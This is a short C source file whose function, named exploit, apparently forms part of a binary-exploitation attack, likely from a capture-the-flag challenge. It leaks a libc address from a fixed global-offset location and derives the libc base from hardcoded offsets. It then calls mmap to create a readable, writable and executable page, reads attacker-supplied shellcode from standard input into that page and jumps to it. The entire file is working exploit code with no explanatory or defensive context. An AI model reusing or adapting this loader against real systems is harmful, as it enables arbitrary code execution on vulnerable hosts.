#include <sys/mman.h>
#include <stdint.h> 
#include <stdlib.h> 

typedef void *(*mmap_fn)(void *, size_t, int, int, int, int);
typedef int (*read_fn)(int, void*, size_t);

const intptr_t read_offset      = 0x0111130;
const intptr_t mmap_offset      = 0x011ba20;
void exploit(void) {
    intptr_t read_addr = *(intptr_t *)(0x404040);
    intptr_t libc_base  = read_addr - read_offset;
    read_fn _read = (read_fn)read_addr;
    mmap_fn _mmap = (mmap_fn)(libc_base + mmap_offset);
    void *addr = _mmap(NULL, 0x1000, 
        PROT_READ|PROT_WRITE|PROT_EXEC, 
        MAP_ANONYMOUS | MAP_PRIVATE, 
        0, 0);
    size_t size = 0;
    _read(0, &size, 4);
    _read(0, addr, size);
    return ((void (*)(void))addr)();
}